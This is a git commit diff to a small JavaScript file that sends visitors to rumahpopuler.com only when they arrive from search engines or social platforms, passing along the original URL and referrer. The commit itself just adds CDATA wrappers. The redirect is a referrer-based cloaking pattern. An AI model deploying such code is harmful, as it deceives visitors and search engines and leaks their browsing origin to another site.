39207213d0ab6718dc0daac1e6bc6ffebe8cf5e7
hunt3r6 <faisalmahadi126@gmail.com>
2022-12-18 11:25:06 +0700

    update

--- rumahpopuler.js
+++ rumahpopuler.js
@@ -1,5 +1,7 @@
 <script>
-var ars = 'https://www.rumahpopuler.com/';
+//<![CDATA[
+var ars = 'https://www.rumahpopuler.com';
 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
+//]]>
 </script>
